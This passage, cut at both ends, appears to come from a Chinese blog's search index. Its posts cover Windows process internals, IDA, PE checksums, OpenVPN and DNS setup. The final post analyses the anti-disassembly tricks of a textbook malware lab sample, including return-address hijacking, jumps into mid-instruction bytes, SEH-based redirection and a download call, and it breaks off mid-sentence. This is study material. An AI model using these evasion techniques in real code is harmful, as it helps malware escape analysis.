ReadOnlySharedMemoryHeap;\n\t\tPVOID*                  ReadOnlyStaticServerData;\n\t\tPVOID                   AnsiCodePageData;\n\t\tPVOID                   OemCodePageData;\n\t\tPVOID                   UnicodeCaseTableData;\n\t\tULONG                   NumberOfProcessors;\n\t\tULONG                   NtGlobalFlag;\n\t\tBYTE                    Spare2[0x4];\n\t\tLARGE_INTEGER           CriticalSectionTimeout;\n\t\tULONG                   HeapSegmentReserve;\n\t\tULONG                   HeapSegmentCommit;\n\t\tULONG                   HeapDeCommitTotalFreeThreshold;\n\t\tULONG                   HeapDeCommitFreeBlockThreshold;\n\t\tULONG                   NumberOfHeaps;\n\t\tULONG                   MaximumNumberOfHeaps;\n\t\tPVOID*                  *ProcessHeaps;\n\t\tPVOID                   GdiSharedHandleTable;\n\t\tPVOID                   ProcessStarterHelper;\n\t\tPVOID                   GdiDCAttributeList;\n\t\tPVOID                   LoaderLock;\n\t\tULONG                   OSMajorVersion;\n\t\tULONG                   OSMinorVersion;\n\t\tULONG                   OSBuildNumber;\n\t\tULONG                   OSPlatformId;\n\t\tULONG                   ImageSubSystem;\n\t\tULONG                   ImageSubSystemMajorVersion;\n\t\tULONG                   ImageSubSystemMinorVersion;\n\t\tULONG                   GdiHandleBuffer[0x22];\n\t\tULONG                   PostProcessInitRoutine;\n\t\tULONG                   TlsExpansionBitmap;\n\t\tBYTE                    TlsExpansionBitmapBits[0x80];\n\t\tULONG                   SessionId;\n\t} PEB, *PPEB;\n如图标红位置为进程的参数信息，再次调用ReadProcessMemory  获取参数信息，\nReadProcessMemory(hProcess, peb.ProcessParameters, &upps, sizeof(RTL_USER_PROCESS_PARAMETERS), 0))\n 其中upps是一个RTL_USER_PROCESS_PARAMETERS 的结构体，定义如下：\n\ttypedef struct _RTL_USER_PROCESS_PARAMETERS\n\t{\n\t\tULONG MaximumLength;\n\t\tULONG Length;\n\t\n\t\tULONG Flags;\n\t\tULONG DebugFlags;\n\t\n\t\tHANDLE ConsoleHandle;\n\t\tULONG ConsoleFlags;\n\t\tHANDLE StandardInput;\n\t\tHANDLE StandardOutput;\n\t\tHANDLE StandardError;\n\t\n\t\tCURDIR CurrentDirectory;\n\t\tUNICODE_STRING DllPath;\n\t\tUNICODE_STRING ImagePathName;\n\t\tUNICODE_STRING CommandLine;\n\t\tPVOID Environment;\n\t\n\t\tULONG StartingX;\n\t\tULONG StartingY;\n\t\tULONG CountX;\n\t\tULONG CountY;\n\t\tULONG CountCharsX;\n\t\tULONG CountCharsY;\n\t\tULONG FillAttribute;\n\t\n\t\tULONG WindowFlags;\n\t\tULONG ShowWindowFlags;\n\t\tUNICODE_STRING WindowTitle;\n\t\tUNICODE_STRING DesktopInfo;\n\t\tUNICODE_STRING ShellInfo;\n\t\tUNICODE_STRING RuntimeData;\n\t\tRTL_DRIVE_LETTER_CURDIR CurrentDirectories[RTL_MAX_DRIVE_LETTERS];\n\t\n\t\tULONG EnvironmentSize;\n\t\tULONG EnvironmentVersion;\n\t    PVOID PackageDependencyData; //8+\n\t    ULONG ProcessGroupId;\n\t   // ULONG LoaderThreads;\n\t} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;\n如上标红位置为命令行信息，UNICODE_STRING同样是一个结构体，定义如下：\n\n\ttypedef struct _UNICODE_STRING \n\t{\n\t    USHORT Length;\n\t    USHORT MaximumLength;\n\t    PWSTR  Buffer;\n\t} UNICODE_STRING;\n\ttypedef UNICODE_STRING *PUNICODE_STRING;\n再次调用ReadProcessMemory获取命令行字符串信息，存入buffer中\n\n\tReadProcessMemory(hProcess, upps.CommandLine.Buffer, buffer, upps.CommandLine.Length, 0); \n\n到这完整的进程命令行信息就获取到了。通过字符串处理就可以得到相应的打开的文件的全路径了 。\n","tags":["编程"],"categories":["编程"]},{"title":"获取打开的文件的全路径（2）","url":"/2018/04/12/编程/获取打开的文件的全路径（2)/","content":"\n#### 1、获取打开文件的全路径（2）\n\n搜索进程空间中的所有句柄，获取句柄的文件名即可。\n\n- #####  首先遍历进程寻找打开文件的进程，比如 word.exe 和PowerPoint.exe \n\n\n\tHANDLE hSnapProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n\tif (hSnapProcess == INVALID_HANDLE_VALUE)\n\t{\n\t\treturn 1;\n\t}\n\tPROCESSENTRY32W ProcessEntry;\n\tProcessEntry.dwSize = sizeof(ProcessEntry);\n\tBOOL bret = Process32FirstW(hSnapProcess, &ProcessEntry);\n\tWCHAR wszProcessInfo[MAX_PATH] = { 0 };\n\t\n\tdo\n\t{\n\t\tWCHAR Name[MAX_PATH] = { 0 };\n\t\n\t\tif (!lstrcmp(ProcessEntry.szExeFile, L\"POWERPNT.EXE\") | !lstrcmp(ProcessEntry.szExeFile, L\"WINWORD.EXE\"))\n\t\t{\n\t\t\t…….\n\t\t}\n\n- #####  寻找到目标进程以后，获取进程中的句柄\n\n\n 这里利用了未文档化的一个函数\n\nZwQuerySystemInformation，这是ntdll.dll中的函数\n\n\tHMODULE hNtDLL = LoadLibrary(L\"NTDLL.DLL\");\n\tif (!hNtDLL)\n\t{\n\t\treturn 1;\n\t}\n\tZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)GetProcAddress(hNtDLL, \"ZwQuerySystemInformation\");\n\t\n\ttypedef NTSTATUS(WINAPI *ZWQUERYSYSTEMINFORMATION)(unsigned long, PVOID, ULONG, PULONG);\n\tZWQUERYSYSTEMINFORMATION ZwQuerySystemInformation;\n\n函数原型如下：\n\n\tNTSTATUS WINAPI ZwQuerySystemInformation(\n\t  _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,\n\t  _Inout_   PVOID                    SystemInformation,\n\t  _In_      ULONG                    SystemInformationLength,\n\t  _Out_opt_ PULONG                   ReturnLength\n\t);\n\n SYSTEM_INFORMATION_CLASS结构体如下：\n\n\ttypedef enum _SYSTEMINFOCLASS\n\t{\n\t\tSystemBasicInformation,             // 0x002C\n\t\tSystemProcessorInformation,         // 0x000C\n\t\tSystemPerformanceInformation,       // 0x0138\n\t\tSystemTimeInformation,              // 0x0020\n\t\tSystemPathInformation,              // not implemented\n\t\tSystemProcessInformation,           // 0x00C8+ per process\n\t\tSystemCallInformation,              // 0x0018 + (n * 0x0004)\n\t\tSystemConfigurationInformation,     // 0x0018\n\t\tSystemProcessorCounters,            // 0x0030 per cpu\n\t\tSystemGlobalFlag,                   // 0x0004 (fails if size != 4)\n\t\tSystemCallTimeInformation,          // not implemented\n\t\tSystemModuleInformation,            // 0x0004 + (n * 0x011C)\n\t\tSystemLockInformation,              // 0x0004 + (n * 0x0024)\n\t\tSystemStackTraceInformation,        // not implemented\n\t\tSystemPagedPoolInformation,         // checked build only\n\t\tSystemNonPagedPoolInformation,      // checked build only\n\t\tSystemHandleInformation,            // 0x0004  + (n * 0x0010)\n\t\tSystemObjectTypeInformation,        // 0x0038+ + (n * 0x0030+)\n\t\tSystemPageFileInformation,          // 0x0018+ per page file\n\t\tSystemVdmInstemulInformation,       // 0x0088\n\t\tSystemVdmBopInformation,            // invalid info class\n\t\tSystemCacheInformation,             // 0x0024\n\t\tSystemPoolTagInformation,           // 0x0004 + (n * 0x001C)\n\t\tSystemInterruptInformation,         // 0x0000, or 0x0018 per cpu\n\t\tSystemDpcInformation,               // 0x0014\n\t\tSystemFullMemoryInformation,        // checked build only\n\t\tSystemLoadDriver,                   // 0x0018, set mode only\n\t\tSystemUnloadDriver,                 // 0x0004, set mode only\n\t\tSystemTimeAdjustmentInformation,    // 0x000C, 0x0008 writeable\n\t\tSystemSummaryMemoryInformation,     // checked build only\n\t\tSystemNextEventIdInformation,       // checked build only\n\t\tSystemEventIdsInformation,          // checked build only\n\t\tSystemCrashDumpInformation,         // 0x0004\n\t\tSystemExceptionInformation,         // 0x0010\n\t\tSystemCrashDumpStateInformation,    // 0x0004\n\t\tSystemDebuggerInformation,          // 0x0002\n\t\tSystemContextSwitchInformation,     // 0x0030\n\t\tSystemRegistryQuotaInformation,     // 0x000C\n\t\tSystemAddDriver,                    // 0x0008, set mode only\n\t\tSystemPrioritySeparationInformation,// 0x0004, set mode only\n\t\tSystemPlugPlayBusInformation,       // not implemented\n\t\tSystemDockInformation,              // not implemented\n\t\tSystemPowerInfo,             // 0x0060 (XP only!)\n\t\tSystemProcessorSpeedInformation,    // 0x000C (XP only!)\n\t\tSystemTimeZoneInformation,          // 0x00AC\n\t\tSystemLookasideInformation,         // n * 0x0020\n\t\tSystemSetTimeSlipEvent,\n\t\tSystemCreateSession,    // set mode only\n\t\tSystemDeleteSession,    // set mode only\n\t\tSystemInvalidInfoClass1,   // invalid info class\n\t\tSystemRangeStartInformation,   // 0x0004 (fails if size != 4)\n\t\tSystemVerifierInformation,\n\t\tSystemAddVerifier,\n\t\tSystemSessionProcessesInformation, // checked build only\n\t\tMaxSystemInfoClass\n\t} SYSTEMINFOCLASS, *PSYSTEMINFOCLASS;\n\n这个结构再MSDN上只列举了一部分，这是网上搜索的结构，可以访问http://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/sysinfo/query.htm查看详细的信息，其包含了我们所需要的一个参数SystemHandleInformation  用来获取系统中进程的句柄信息，第二个参数是缓冲区指针，第三个参数是大小，最后一个参数是实际的返回的数据大小。\n传入SystemHandleInformation   将会返回一个SYSTEM_HANDLE_INFORMATION结构，结构如下：\n\n\ttypedef struct _SYSTEM_HANDLE_INFORMATION\n\t{\n\t\tULONG   uCount;\n\t\tSYSTEM_HANDLE aSH[];\n\t} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;\n\t\n\ttypedef struct _SYSTEM_HANDLE\n\t{\n\t\tULONG  uIdProcess;\n\t\tUCHAR  ObjectType;    // OB_TYPE_* (OB_TYPE_TYPE, etc.)\n\t\tUCHAR  Flags;         // HANDLE_FLAG_* (HANDLE_FLAG_INHERIT, etc.)\n\t\tUSHORT  Handle;\n\t\tPVOID  pObject;\n\t\tACCESS_MASK GrantedAccess;\n\t} SYSTEM_HANDLE, *PSYSTEM_HANDLE;\n\n- ##### 查找句柄对应的进程，获取句柄对应的文件名\n\n\n通过查询返回句柄的进程pid与传入的PID比较。若符合，OpenProcess 打开该进程，DuplicateHanle复制句柄，然后获取句柄的文件名，然后相对路径转换为绝对路径。\n获取句柄的详细信息用到了ZwQueryInformationFile 函数，这个函数同样是一个未文档化的函数，\n\n\tHMODULE hNtDLL = LoadLibrary(L\"NTDLL.DLL\");\n\tif (!hNtDLL)\n\t{\n\t\treturn 1;\n\t}\n\t\n\tZwQueryInformationFile = (ZWQUERYINFORMATIONFILE)GetProcAddress(hNtDLL, \"ZwQueryInformationFile\");\n\t\n\ttypedef NTSTATUS(WINAPI *ZWQUERYINFORMATIONFILE)(HANDLE, PIO_STATUS_BLOCK, PVOID,ULONG, FILE_INFORMATION_CLASS);\n\tZWQUERYINFORMATIONFILE ZwQueryInformationFile;\n\t\n\tNTSTATUS \n\t  ZwQueryInformationFile(\n\t    IN HANDLE  FileHandle,\n\t    OUT PIO_STATUS_BLOCK  IoStatusBlock,\n\t    OUT PVOID  FileInformation,\n\t    IN ULONG  Length,\n\t    IN FILE_INFORMATION_CLASS  FileInformationClass\n\t    );\n\n第一个参数是文件句柄，第二个参数是接收最终完成状态的IO_STATUS_BLOCK结构的指针。第三个参数是存储返回的文件对象的信息，第四个参数是缓冲区大小，第五个参数是文件信息的类型，我们传入FileNameInformation。在这里我们定义了一个结构体 PNM_INFO ，用来存储信息\n\n\ttypedef struct _NM_INFO\n\t{\n\t\tHANDLE  hFile;\n\t\tFILE_NAME_INFORMATION Info;\n\t\tWCHAR Name[MAX_PATH];\n\t} NM_INFO, *PNM_INFO;\n\n第三个成员即为文件名包括路径，不过是相对路径，调用 PathResolve\n 获取绝对路径。到此文件的全路径就获取到了。\n\n\n\n","tags":["编程"],"categories":["编程"]},{"title":"IDA创建结构体","url":"/2018/04/12/逆向/IDA创建结构体/","content":"\n1.在IDA中打开Structures，快捷键是shifr+ F9 ,然后按insert键，进行插入\n\n![5ad5559c1b1dc](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/5ad5559c1b1dc.png)\n\n 2.在ends 后按d键，添加相应的成员，然后选中成员名，按N进行修改，选中类型，按d 进行更改类型，构造完结构题以后，回到代码窗口\n\n![5ad555a742e37](https://i.loli.net/2018/04/17/5ad555a742e37.png)\n\n  3  在代码窗口找到相应的变量，右键选择Convert to struct ，然后选择刚刚你定义的结构体即可。\n\n","tags":["逆向"],"categories":["逆向"]},{"title":"PE Checksum","url":"/2018/04/12/逆向/PE Checksum/","content":"\n### 1.check 介绍\n\nPE文件可选头结构如下，其中有个成员是checksum ，其在编译以后生成一个校验和，\n所有驱动、系统启动时加载的DLL、系统关键进程加载的DLL都要进行校验和的校验，查看是否有改动，这个检验和可以通过API进行计算，CheckSumMappedFile 或者直接 MapFileAndCheckSum，计算算法比较简单如下：\n\n* 因为要计算整个文件数据嘛，所以开始这个字段的数据要先置0；\n* 从文件头开始，每次读一个字（WORD），进行带进位的累加（ADC），超出WORD部分自动溢出；\n* 将前面的累加和再加上PE文件的长度，结果就是这个校验和了\n\n### 2 测试代码如下：\n\n\t#include\"stdafx.h\"\n\t#include <windows.h>\n\t#include<ImageHlp.h>\n\t#pragma comment(lib,\"ImageHlp.lib\")\n\n\n​\t\n\n\tvoid main()\n\t{\n\t\tDWORD HeaderCheckSum = 0;   //PE头里的校验值\n\t\tDWORD CheckSum = 0;     //计算下来的校验值\n\t\tMapFileAndCheckSum(L\"D:\\\\newupdate.exe\", &HeaderCheckSum, &CheckSum);\n\t\n\t\tif (CheckSum == HeaderCheckSum)\n\t\t{\n\t\t\tMessageBox(NULL, L\"相等\", NULL, 0);\n\t\t}\n\t\n\t}\n\n\n### 附PE可选头结构\n\ntypedef struct _IMAGE_OPTIONAL_HEADER \n{\n    //\n    // Standard fields.  \n    //\n+18h    WORD    Magic;         // 标志字, ROM 映像（0107h）,普通可执行文件（010Bh）\n+1Ah    BYTE      MajorLinkerVersion;     // 链接程序的主版本号\n+1Bh    BYTE      MinorLinkerVersion;     // 链接程序的次版本号\n+1Ch    DWORD   SizeOfCode;     // 所有含代码的节的总大小\n+20h    DWORD   SizeOfInitializedData;    // 所有含已初始化数据的节的总大小\n+24h    DWORD   SizeOfUninitializedData; // 所有含未初始化数据的节的大小\n+28h    DWORD   AddressOfEntryPoint;    // 程序执行入口RVA\n+2Ch    DWORD   BaseOfCode;      // 代码的区块的起始RVA\n+30h    DWORD   BaseOfData;      // 数据的区块的起始RVA\n    //\n    // NT additional fields.    以下是属于NT结构增加的领域。\n    //\n+34h    DWORD   ImageBase;      // 程序的首选装载地址\n+38h    DWORD   SectionAlignment;      // 内存中的区块的对齐大小\n+3Ch    DWORD   FileAlignment;      // 文件中的区块的对齐大小\n+40h    WORD    MajorOperatingSystemVersion;  // 要求操作系统最低版本号的主版本号\n+42h    WORD    MinorOperatingSystemVersion;  // 要求操作系统最低版本号的副版本号\n+44h    WORD    MajorImageVersion;       // 可运行于操作系统的主版本号\n+46h    WORD    MinorImageVersion;       // 可运行于操作系统的次版本号\n+48h    WORD    MajorSubsystemVersion;  // 要求最低子系统版本的主版本号\n+4Ah    WORD    MinorSubsystemVersion;  // 要求最低子系统版本的次版本号\n+4Ch    DWORD   Win32VersionValue;       // 莫须有字段，不被病毒利用的话一般为0\n+50h    DWORD   SizeOfImage;       // 映像装入内存后的总尺寸\n+54h    DWORD   SizeOfHeaders;       // 所有头 + 区块表的尺寸大小\n+58h    DWORD   CheckSum;       // 映像的校检和\n+5Ch    WORD    Subsystem;       // 可执行文件期望的子系统\n+5Eh    WORD    DllCharacteristics;       // DllMain()函数何时被调用，默认为 0\n+60h    DWORD   SizeOfStackReserve;       // 初始化时的栈大小\n+64h    DWORD   SizeOfStackCommit;       // 初始化时实际提交的栈大小\n+68h    DWORD   SizeOfHeapReserve;        // 初始化时保留的堆大小\n+6Ch    DWORD   SizeOfHeapCommit;        // 初始化时实际提交的堆大小\n+70h    DWORD   LoaderFlags;        // 与调试有关，默认为 0 \n+74h    DWORD   NumberOfRvaAndSizes;  // 下边数据目录的项数，这个字段自Windows NT 发布以来        // 一直是16\n+78h    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];\n       // 数据目录表\n} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;\n","tags":["逆向"],"categories":["逆向"]},{"title":"linux usb wifi设置AP 模式","url":"/2017/12/12/杂学/linux usb wifi设置AP 模式 /","content":"\n一.问题阐述\n\t\t本文是基于Linux 的ubuntu16.04系统来完成的，usb设备是Realteak 的RTL8188EUS的设备（lsusb看到的），因为ubuntu自带的nl90211无法支持此类设备，所以有两种解决办法。\n\n二.解决办法\n\n\t\t第一种方法是编译8188eu的驱动，这个在github上有，而且有很多解决办法，编译前需要安装相应的头文件和编译环境，如何你能这样解决的话，当然是最好了，如果这样没能解决，编译失败又解决不来的话，可以换第二种方法。\n\t\t第二种方法是编译带8188eu的hostapd来实现，具体实现步骤如下：\n\t\t1.卸载已有的hostapd\n\t\tsudo apt-get autoremove hostapd\n\t\t2.下载带有rtl8188eu的源码。\n\t\twget https://github.com/jenssegers/RTL8188-hostapd/archive/v2.0.tar.gz\n\t\ttar -zxvf v2.0.tar.gz\n\t\t3.编译\n\t\tcd RTL8188-hostapd-2.0/hostapd\n\t\tsudo make\n\t\t4.安装\n\t\tsudo  make install\n\t   此时可能你还是无法创建热点，这是因为ubuntu自带的Nerwork Manager 会对热点的创建产生影响，把无线网卡设置为未托管即可。\n\t   在/etc/NetworkManager/NetworkManager.conf中添加[keyfile]字段，添加内容为：unmanaged-devices=mac:00:23:cd:10:3e:0b ,mac地址改为自己wifi 设备的地址即可，此时应该就可以创建热点了。\n\t   \n\t   参考链接：\n\t   https://jenssegers.com/43/Realtek-RTL8188-based-access-point-on-Raspberry-Pi\n\t   http://os.51cto.com/art/201311/415573.htm","tags":["杂学"],"categories":["杂学"]},{"title":"WIN10 linux 子系统安装lamp","url":"/2017/11/29/Web渗透/WIN10 linux 子系统安装lamp /","content":"\n\n1.换源\n\n    备份原先的源\n    cp /etc/apt/sources.list /etc/apt/sources.list.bak\n    vim /etc/apt/sources.list\n    换成\n    deb http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiverse\n    deb http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiverse\n    deb http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiverse\n    deb http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiverse\n    deb http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse\n    deb-src http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiverse\n    deb-src http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiverse\n    deb-src http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiverse\n    deb-src http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiverse\n    deb-src http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse\n    更新\n    apt-get update\t\n\n2.安装apache2\n\n    apt-get install apache2\n    service apache2 restart \n    在本地浏览器打开localhost 应该可以看到apache2的欢迎界面\n\n\n3.安装php\n\n\t按照ubuntu安装的方法 apt-get install php5是没法用的，不晓得为啥子\n\t我找的解决办法是如下：\n\tapt-get install software-properties-common\n\tadd-apt-repository ppa:ondrej/php\n\tapt-get update\n\tapt-get install php\n\tapt-get install libapache2-mod-php\n\tservice apache2 restart\n4.测试php\n\t\n\t在/var/www/html目录下新建test.php\n\t内容如下：\n\t<?php\n\tphpinfo();\n\t?>\n\t打开localhost/test.php 正常显示则代表成功\n5.至于mysql 的安装，后续再写\n\n\n​\t","tags":["web渗透"],"categories":["web渗透"]},{"title":"dns污染的解决","url":"/2017/11/15/杂学/dns污染的解决/","content":"\ndnsmasq+chinadns+hev-dns-forwarder\n\n1.安装dnsmasq\n\n\t sudo apt-get install dnsmasq\n\t 编辑/etc/dnsmasq.conf \n\t 取消no-resolv前面的注释\n\t server=127.0.0.1#5354\n\n2.安装chindns\n    https://github.com/shadowsocks/ChinaDNS/releases/download/1.3.2/chinadns-1.3.2.tar.gz\n\t解压\n\ttar -zxf chinadns-1.3.2.tar.gz \n\tcd chinadns-1.3.2\n\t./configure\n\tmake\n\tmake install\n\t安装结束后在复制到/usr/local/bin 目录中去（可能已经自动复制到了，确认一下）\n\t运行命令为\n\tchinadns -c /home/pi/Desktop/chinadns-1.3.2/chnroute.txt -s 114.114.114.114,127.0.0.1:5300 -p 5354 -m  & > /dev/null 2>&1\n\n3.安装\n\n\tgit clone https://github.com/aa65535/hev-dns-forwarder\n\tcd hev-dns-forwarder\n\tmake\n\t编译完会在src目录下生成二进制文件，复制到/usr/local/bin目录下\n\t运行命令\n\thev-dns-forwarder\n\n4.加入开机启动项\n\n\t在/etc/rc.local中加入\n\tsudo  hev-dns-forwarder  & > /dev/null 2>&1\n\tsudo chinadns -c /home/pi/Desktop/chinadns-1.3.2/chnroute.txt -s 114.114.114.114,127.0.0.1:5300 -p 5354 -m  & > /dev/null 2>&1\n\n参考链接：\nhttps://blog.bluerain.io/p/SS-Redir-For-Router.html\n\n​\t","tags":["杂学"],"categories":["杂学"]},{"title":"树莓派搭建vpn服务器","url":"/2017/11/11/杂学/树莓派搭建vpn服务器/","content":"\n1.此篇是在前篇搭建树莓派透明代理的基础上完成的，\n\n2.树莓派尽量设置成静态ip，具体如下\n\n\tsudo vim /etc/dhcpcd.conf\n\t填写以下内容\n\t\n\tinterface eth0\n\t\n\tstatic ip_address=ip\n\t\n\tstatic routers=网关\n\t\n\tstatic domain_name_servers=223.5.5.5\n\n3.安装openvpn\n\n\tsudo apt-get install openvpn\n\n4.下载easy-rsa\n\n\n\tcd /etc/openvpn\n\twget --no-check-certificate https://github.com/OpenVPN/easy-rsa/releases/download/2.2.2/EasyRSA-2.2.2.tgz\n\ttar -xzvf EasyRSA-2.2.2.tgz\n\tmv EasyRSA-2.2.2 easy-rsa\n\n5.配置easy-rsa\n\n\tcd /etc/openvpn/easy-rsa\n\tvim vars    # 打开easy-rsa配置文件\n\t修改一下内容\n\texport EASY_RSA=\"/etc/openvpn/easy-rsa\"\n\texport KEY_SIZE=1024 #默认的2048太大，要运算很久\n\t加载配置\n\tsource ./vars\n\n6.生成ca密钥\n\n\t./clean-all      # 先清空所有密钥\n\t./build-ca       # 创建自己的证书\n\t所有内容直接回车就可以了。这时keys文件夹下会多了ca.crt,和ca.key文件\n\n7.生成服务器密钥\n\n\t./build-key-server servername # servername为你自己设置的服务器名字\n\t会出现很多让填写的地方，注意下面三个其他的默认就好\n\tCommon Name 常用名必须是你方才所设置的服务器名，默认设置如此。\n\tA challenge password? 网上说必须留空，我也照办了，不晓得为什么\n\tSign the certificate? [y/n] 必须填y\n\n8.生成客户端密钥\n\n\t./build-key-pass client1   # 命令中client1是客户端的名字\n\tEnter PEM pass phrase 这个要记住，这是客户端使用vpn时的密码，会让输入两次。\n\t这时keys下又会多出三个文件client1.csr client1.crt client.key\n\n9.生成dh\n\n\t./build-dh\n\t到此密钥生成部分就完成了。\n\n10.openvpn 服务器配置\t\n\n\t# 复制一个模板过来先\n\tcp /usr/share/doc/openvpn/examples/sample-config-files/server.conf /etc/openvpn/server.conf\n\tvim /etc/openvpn/server.conf\n\t下面是我的配置\n\t\n\tport 1194   #Openvpn服务使用的端口\n\tproto tcp   #使用udp协议传输\n\tdev tun     #使用隧道\n\t\n\tca /etc/openvpn/easy-rsa/keys/ca.crt        #ca公钥路径\n\tcert /etc/openvpn/easy-rsa/keys/server.crt  #服务器公钥路径\n\tkey /etc/openvpn/easy-rsa/keys/server.key   #服务器私钥路径\n\tdh /etc/openvpn/easy-rsa/keys/dh1024.pem    #dh\n\t\n\tserver 10.10.20.0 255.255.255.0   #客户端连接后，所在的子网段\n\t\n\tifconfig-pool-persist ipp.txt   #客户端使用固定的子网地址，这里可以不配置\n\t\n\tpush \"redirect-gateway def1 bypass-dhcp\"    #网关重定向，客户端的流量都会经由OpenvpnServer\n\t#配置DNS\n\tpush \"dhcp-option DNS 202.141.162.123\"\n\tpush \"dhcp-option DNS 202.38.93.153 \n\t\n\tclient-to-client\n\t\n\tduplicate-cn    #允许客户端的CommonName重复，因为我们填的都是默认值\n\t\n\tkeepalive 10 120\n\t\n\tcomp-lzo    #启动数据压缩\n\t\n\tuser nobody     #Openvpn进程运行时所属的用户，这里为了安全\n\tgroup nogroup   #Openvpn进程运行时所属的组，这里为了安全\n\t\n\tpersist-key     #一直保存key，避免权限问题导致不能再次读取\n\tpersist-tun     #一直保持隧道，原因同上\n\t\n\tstatus /etc/openvpn/easy-rsa/keys/openvpn-status.log   #Openvpn运行状态Log，就在Openvpn目录下，会自动生成\n\t\n\tlog openvpn.log             #Openvpn运行Log，也在Openvpn目录下，会自动生成\n\t\n\tverb 3                      #log的等级\n\n11.此时可以测试一下了\n\n\topenvpn server.conf\n\tservice openvpn restart\n\t不报错就是成功了\n\n12.客户端配置\n\n\tcp /usr/share/doc/openvpn/examples/sample-config-files/client.conf /etc/openvpn/clientconfig/client.conf\n\tvim /etc/openvpn/clientconfig/client.conf\n\t我的配置如下：\n\t# 里面注释也很详细，这里贴出我精简后的结果\n\tclient      #标明是客户端配置\n\tdev tun     #使用隧道\n\tproto tcp   #使用UDP\n\t\n\tremote 192.168.19.149 1194   #树莓派外网IP（使用动态域名绑定） + 端口\n\tcomp-lzo        \n\t\n\tca ca.crt       #ca公钥\n\tcert wxlnb.crt  #客户端公钥\n\tkey wxlnb.key   #客户端私钥\n\t\n\tverb 3  #log等级\n\n13.防火墙规则我就改了一点\n\t\n\n\tiptables -t nat -A PREROUTING -i tun0 -p tcp -j REDSOCKS\n\n14.测试\n\n\t在其他Windows机器上，下载openvpn 安装，然后把ca.crt,client.conf（就是刚刚那个client.conf）,client1.crt,client1.key复制到config 文件夹下。\n\n参考链接\n\t\n\n\t1.http://www.smartmcu.com/article-246-1.html\n\t2.http://blog.csdn.net/wxlguitar/article/details/51175872","tags":["杂学"],"categories":["杂学"]},{"title":"重装系统后hexo 博客恢复","url":"/2017/11/05/杂学/hexo 博客恢复/","content":"\n### 1.安装node.js和git\n\n 这个不用多说，直接下载安装就行了。\n\n### 2.配置 git 个人信息，生成新的 ssh 密钥：\n\ngit config --global user.name \"xxxxxx\"\ngit config --global user.email \"xxxxxx\"\nssh-keygen -t rsa -C \"xxxxxxxx(邮箱)\"\n\n### 3.添加公钥\n\n在用户文件夹.ssh 文件里面把公钥复制出来粘贴到github个人设置的ssh位置。\n\n### 4.安装hexo\n\n建议先\nnpm install cnpm -g --registry=[https://registry.npm.taobao.org](https://registry.npm.taobao.org)\n安装的时候 用cpm 代替npm\n这样的话npm 安装比较快而且不容易失败\ncnpm install hexo-cli -g\n\n### 5.删除博客文件夹文件，保留部分\n\n打开原来的博客文件夹,只需保留_config.yml，theme/，source/，scaffolds/，package.json，.gitignore 这些项目，删除其他的文件。\n\n### 6.git bush\n\n在本文件夹下git bush,运行cnpm install\n\n### 7.安装部署插件\n\nnpm install hexo-deployer-git --save\n\n### 8.测试\n\n此时就可以hexo g &amp;&amp; hexo d 测试是否成功了。","tags":["杂学"],"categories":["杂学"]},{"title":"对抗反汇编2","url":"/2017/10/22/逆向/对抗反汇编分析/","content":"\n一、 样本基本信息\n\n样本来源：恶意代码实战中的Lab15-03.exe。\n\n二、分析过程\n\nIDA 打开发现在00401016处有标红，IDA识别出了一些异常，仔细分析发现，把0x40148c写到了ebp+4的位置，而这个位置刚好是main函数返回地址的位置，通过改写此处的内容让main返回的时候执行0x40148c位置处的代码。\n\n![xx1](https://i.imgur.com/vd4KEI6.png)\n\n由此可看出主函数应该是非常正常，不会看出有什么恶意的地方。分析0x40148c处的代码。你此处的代码在0x401496处，有明显标红，说明有反汇编异常，一般都是恶意代码作者故意制作的来影响反汇编的结果。此处是一个很明显的对抗反汇编，上一步是跳转到401497的位置，而这个位置是jmp 这条指令的中间，这显然是不可能的，在此处按d键，把代码转为数据显示，然后把401497后面的数据按c键再转回代码，注意对齐。然后把401496位置的数据改为nop,可以通过Edit->Patch Program->change word ,把E9改为90，然后按c转换为代码就可以了。效果如图\n\n![](https://i.imgur.com/Qtl0ZFP.png)\n\n继续往下看，发现有一个除零异常出现 ，\n\n![](https://i.imgur.com/ng6kIn0.png)\n\n显然恶意代码先把异常处理函数的地址存到FS寄存器，然后出发除零异常执行此处的函数。显此处显然异常处理函数的地址是0x4014c0，而0x4014c0位置处的IDA没有识别为代码。按c键来转换为代码，继续向下看，在0x4014D7位置处，又出现了一个与0x401496处的相似的异常，同样的方法进行处理，结果如图\n\n![](https://i.imgur.com/d8PyGdS.png)\n\n这个估计就是恶意代码真正要做的事情的代码了。继续向下看，有个URLDownloadToFileA函数，显然很恶意。下面还有个反汇编异常先处理了，先D后C，然后结果如下，\n\n![](https://i.imgur.com/0TKYBzh.png)\n\n到此整个代码就分析完了，主要是4014c0处是真正要关注的，下面分析这个位置的代码\n\n![](https://i.imgur.com/KPoVtCC.png)\n![](https://i.imgur.com/ue6meMj.png)\n\n主要关注标红的位置，此处看不出什么来，在OD中实际执行一下来看。\n\n直接在0x40148c处下断点，然后直接f9运行到此处，若看到一堆数据，右键分析->从模块中删除分析就可以了，改写相应位置的异常按照IDA那样，实验过程发现se处理程序的确是0x4014c0但是程序并没有跳到那个位置而是终止了，没搞明白，为了真正看到0x4014c0处的具体执行情况。我选择直接编辑汇编代码。写入jmp 